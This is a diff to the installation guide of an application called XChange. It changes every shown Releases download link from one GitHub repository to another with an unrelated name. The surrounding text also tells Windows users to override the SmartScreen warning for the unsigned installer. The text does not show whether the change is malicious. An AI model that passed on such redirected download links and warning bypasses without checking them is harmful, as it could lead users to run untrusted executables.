@@ -1,7 +1,7 @@
 # Installing XChange
 
 > **There are releases; macOS ones are signed, Windows ones are not.** The
-> [Releases](https://github.com/dx5tool/fury-nomaster/releases)
+> [Releases](https://github.com/dx5tool/tiktoklead/releases)
 > page has had builds since 18.08.2026; the current one is 0.4.20 for Windows x64
 > and macOS on Apple Silicon. Each ships with
 > `SHA256SUMS` and a `REPORT.md` — the measurement the core passed before it was
@@ -40,7 +40,7 @@ corrupt download rather than at us.
 ### 1. The application
 
 Download `xchange-<version>-macos-<arch>.dmg` from
-[Releases](https://github.com/dx5tool/fury-nomaster/releases). `arch` is `arm64` for
+[Releases](https://github.com/dx5tool/tiktoklead/releases). `arch` is `arm64` for
 any Apple-silicon Mac (M1 and later) — if you are not sure,  → About This Mac
 says which. Intel Macs have no release build yet: the name would be `x86_64`,
 and until one is published the way in on an Intel machine is to build it.
@@ -158,7 +158,7 @@ a Windows machine. It has been run now, and `tools/verify-windows.ps1` passes
 ### 1. The application
 
 Download `xchange-<version>-windows-x64-setup.exe` from
-[Releases](https://github.com/dx5tool/fury-nomaster/releases)
+[Releases](https://github.com/dx5tool/tiktoklead/releases)
 and run it. **SmartScreen will object** — "Windows protected your PC" — because
 the installer is not signed, not because anything is wrong with it. Press
 **More info**, then **Run anyway**.
